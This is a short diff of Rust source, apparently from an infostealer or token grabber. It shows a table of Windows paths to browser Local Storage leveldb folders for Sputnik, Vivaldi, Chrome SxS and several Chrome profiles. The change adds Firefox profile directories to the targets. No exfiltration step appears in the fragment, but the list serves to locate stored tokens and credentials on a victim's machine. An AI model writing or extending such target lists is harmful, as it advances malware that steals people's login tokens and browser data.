@@ -52,6 +52,7 @@ lazy_static! {
             ("Sputnik", format!("{}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\", APPDATA)),
             ("Vivaldi", format!("{}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
             ("Chrome SxS", format!("{}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\", APPDATA)),
+            ("Firefox", format!("{}\\Mozilla\\Firefox\\Profiles\\", ROAMING)),
             ("Chrome", format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
             ("Chrome1", format!("{}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", APPDATA)),
             ("Chrome2", format!("{}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", APPDATA)),
